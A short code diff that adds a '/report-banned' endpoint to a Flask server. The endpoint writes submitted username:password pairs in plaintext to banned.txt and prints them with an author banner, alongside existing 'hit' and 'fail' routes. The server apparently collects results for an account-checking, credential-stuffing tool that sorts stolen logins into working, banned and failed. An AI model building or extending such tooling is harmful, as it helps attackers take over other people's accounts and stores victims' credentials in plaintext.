@@ -380,6 +380,26 @@ def report_hit():
     logger.info('Logged hit: %s', username)
     return jsonify({"status": "success"})
 
+@app.route("/report-banned", methods=["POST"])
+def report_banned():
+    data = request.json
+    username = data.get("username")
+    password = data.get("password")
+    if not username or not password:
+        return jsonify({"error": "Missing username or password"}), 400
+    
+    # Save as BANNED
+    banned_file = os.path.join(HIT_FOLDER, "banned.txt")
+    with open(banned_file, "a") as f:
+        f.write(f"{username}:{password}\n")
+    
+    # Display BANNED
+    print_status(f"{Fore.RED}[ BANNED ] | {username}:{password}", "error")
+    print_status(f"{Fore.RED}Made By 🔥 @AliveRishu 🔥", "error")
+    
+    logger.info('Logged banned account: %s', username)
+    return jsonify({"status": "success"})
+
 @app.route("/report-fail", methods=["POST"])
 def report_fail():
     data = request.json
